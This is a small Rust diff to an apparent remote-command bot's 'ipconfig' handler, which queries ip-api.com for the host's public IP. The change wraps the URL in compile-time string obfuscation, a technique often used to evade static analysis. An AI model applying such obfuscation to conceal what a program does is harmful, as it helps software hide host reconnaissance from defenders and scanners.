@@ -96,7 +96,7 @@ impl BotCommand for IpconfigCommand {
 
 // gets rich public ip info from ip-api.com
 async fn get_public_ip_info() -> Result<String> {
-    let resp = reqwest::get("http://ip-api.com/json").await?.text().await?;
+    let resp = reqwest::get(obfstr::obfstr!("http://ip-api.com/json")).await?.text().await?;
     let v: Value = serde_json::from_str(&resp)?;
 
     if v["status"] != "success" {
